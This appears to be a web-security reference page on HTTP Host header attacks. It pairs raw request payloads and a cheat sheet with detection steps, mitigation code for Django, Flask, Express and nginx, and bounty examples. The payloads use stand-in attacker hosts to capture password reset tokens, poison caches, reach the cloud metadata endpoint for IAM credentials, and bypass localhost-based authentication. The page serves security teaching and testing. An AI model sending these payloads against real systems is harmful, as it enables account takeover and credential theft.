---
title: Host Header Attacks
description: Exploiting trust in the HTTP Host header for cache poisoning, SSRF, and authentication bypass
tags:
  - server-side
  - web
  - cache-poisoning
  - ssrf
  - authentication
---

# Host Header Attacks

## Overview

Host header attacks exploit applications that trust the `Host` header without proper validation. This can lead to cache poisoning, password reset poisoning, SSRF, authentication bypass, and more.

**Impact:** Cache poisoning, password reset hijacking, SSRF, web cache deception, authentication bypass

## Attack Vectors

### 1. Password Reset Poisoning

```http
POST /reset-password HTTP/1.1
Host: evil.com
Content-Type: application/json

{"email": "victim@target.com"}
```

Reset link sent to victim: `https://evil.com/reset?token=SECRET` → attacker captures token.

### 2. Cache Poisoning

```http
GET / HTTP/1.1
Host: evil.com
X-Forwarded-Host: target.com
```

If cached, serves `evil.com` content to all users requesting `target.com`.

### 3. SSRF via Host Header

```http
GET /api/fetch HTTP/1.1
Host: 169.254.169.254
```

Application makes internal request to `http://169.254.169.254/latest/meta-data/`.

### 4. Authentication Bypass

```http
GET /admin HTTP/1.1
Host: localhost
```

Some apps trust `localhost` or internal hostnames without authentication.

### 5. Web Cache Deception

```http
GET /profile.css HTTP/1.1
Host: target.com
```

If app serves `/profile` (private) for `/profile.css` (cached), private data leaks.

## Payloads

### Basic Manipulation

```http
Host: evil.com
Host: target.com.evil.com
Host: target.com@evil.com
Host: target.com%00.evil.com
Host: target.com#evil.com
```

### Duplicate Host Headers

```http
Host: target.com
Host: evil.com
```

(Some parsers use first, others use last)

### Absolute URL in Request Line

```http
GET https://target.com/ HTTP/1.1
Host: evil.com
```

### Injection

```http
Host: target.com
 evil.com
Host: target.com\r\nX-Forwarded-Host: evil.com
```

### Port Manipulation

```http
Host: target.com:1337
Host: target.com:@evil.com
Host: target.com:80@evil.com
```

### Internal Hosts

```http
Host: localhost
Host: 127.0.0.1
Host: 169.254.169.254
Host: [::1]
Host: 0.0.0.0
```

## Detection

**Manual Testing:**

1. Intercept request in Burp/Caido
2. Modify `Host` header
3. Check response for:
   - Different content
   - Absolute URLs in HTML (hrefs, src)
   - Redirect location
   - Email/notification content
4. Test related headers: `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`

**Automated:**

```bash
# ffuf
ffuf -u https://target.com -H "Host: FUZZ.target.com" -w hosts.txt

# Burp Collaborator
Host: BURP-COLLABORATOR-SUBDOMAIN

# Custom script
for host in evil.com localhost 127.0.0.1; do
    curl -H "Host: $host" https://target.com
done
```

**Tools:**

- Burp Suite (Turbo Intruder, Param Miner)
- `hostheadercheck.py`
- Nuclei templates (`host-header-injection`)

## Exploitation

### Password Reset Poisoning

**Steps:**

1. Trigger password reset for victim
2. Set `Host: evil.com`
3. Reset email sent to victim with `https://evil.com/reset?token=xyz`
4. Victim clicks link → attacker logs token on `evil.com`
5. Attacker uses token to reset password on real site

**Example:**

```http
POST /api/password-reset HTTP/1.1
Host: attacker-controlled.com
Content-Type: application/json

{"email": "victim@target.com"}
```

### Cache Poisoning

**Steps:**

1. Find a cacheable endpoint (static resources, CSS, JS)
2. Inject malicious `Host` header
3. Poison cache with attacker-controlled content
4. Legitimate users receive poisoned response

**Example:**

```http
GET /static/app.js HTTP/1.1
Host: evil.com
X-Forwarded-Host: target.com
```

Response cached with `evil.com` content.

### SSRF (Internal Metadata)

```http
GET /api/health-check HTTP/1.1
Host: 169.254.169.254
```

If app makes internal request: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.

### Authentication Bypass

```http
GET /admin/dashboard HTTP/1.1
Host: localhost
X-Forwarded-For: 127.0.0.1
```

Some apps trust `localhost` = authenticated admin.

### Routing-based SSRF

```http
GET /_next/image?url=https://attacker.com/image.png HTTP/1.1
Host: internal-service
```

Next.js image optimizer proxies request to `http://internal-service/_next/image?url=...`.

## Mitigation

**Input Validation:**

```python
# Python/Django
from django.http import HttpResponseBadRequest

ALLOWED_HOSTS = ['target.com', 'www.target.com']

def validate_host(request):
    host = request.META.get('HTTP_HOST', '').split(':')[0]
    if host not in ALLOWED_HOSTS:
        return HttpResponseBadRequest("Invalid Host header")
```

**Framework Configuration:**

```python
# Django settings.py
ALLOWED_HOSTS = ['target.com', 'www.target.com']

# Flask
from flask import request, abort
@app.before_request
def check_host():
    if request.host not in ['target.com', 'www.target.com']:
        abort(400)

# Express.js (vhost middleware)
const vhost = require('vhost');
app.use(vhost('target.com', targetApp));
```

**Absolute URLs:**

```python
# Don't trust Host header for URL construction
reset_url = f"https://target.com/reset?token={token}"

# NOT:
reset_url = f"https://{request.headers['Host']}/reset?token={token}"
```

**Proxy Configuration:**

```nginx
# Nginx - remove/override X-Forwarded-Host
proxy_set_header X-Forwarded-Host $host;
proxy_set_header Host $host;

# Drop duplicate Host headers
if ($http_host ~ "^(.+),(.+)$") {
    return 400;
}
```

## Real-World Examples

### Shopify (2016)

- Password reset poisoning via `X-Forwarded-Host`
- $500 bounty

### HackerOne (2015)

```http
POST /users/password/new HTTP/1.1
Host: evil.com
```

- Password reset email contained `https://evil.com/reset?token=xyz`
- $500 bounty

### Uber (2017)

- Host header injection → cache poisoning
- Served attacker-controlled JS to all users
- Critical severity

### PayPal

```http
GET /signin HTTP/1.1
Host: evil.com
```

- Login page reflected `Host` in action URL
- Form submitted credentials to `https://evil.com`
- High severity

## Hunting Tips

1. **Password Reset Flows:** Always test Host header + `X-Forwarded-Host`
2. **Cached Resources:** Static files, CDNs (CloudFront, Cloudflare)
3. **Email Notifications:** Signup, reset, notification emails (check for absolute URLs)
4. **Redirects:** Check `Location` header for Host reflection
5. **Internal Services:** Try `localhost`, `127.0.0.1`, `169.254.169.254`
6. **Duplicate Headers:** Some apps parse first, others last
7. **Subdomain Takeover:** `Host: subdomain.target.com` (if subdomain unused)
8. **Port Variations:** `:443`, `:80`, `:8080`, `:@evil.com`

## Cheat Sheet

```http
# Basic
Host: evil.com

# Duplicate
Host: target.com
Host: evil.com

# Injection
Host: target.com
 evil.com

# Forwarded
X-Forwarded-Host: evil.com
X-Forwarded-Server: evil.com
X-Host: evil.com

# SSRF
Host: 169.254.169.254
Host: localhost
Host: 127.0.0.1

# Port manipulation
Host: target.com:1337@evil.com

# Absolute URL
GET https://target.com/ HTTP/1.1
Host: evil.com
```

## References

- [PortSwigger - Host Header Attacks](https://portswigger.net/web-security/host-header)
- [James Kettle - Practical HTTP Host Header Attacks](https://portswigger.net/research/practical-http-host-header-attacks)
- [OWASP - Host Header Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection)
- [HackerOne Reports](https://hackerone.com/reports?query=host+header)

---

**Severity:** Medium to Critical (depending on exploitation)  
**CVSS:** 5.3 - 9.1 (password reset poisoning / cache poisoning)  
**CWE:** CWE-644 (Improper Neutralization of HTTP Headers for Scripting Syntax)
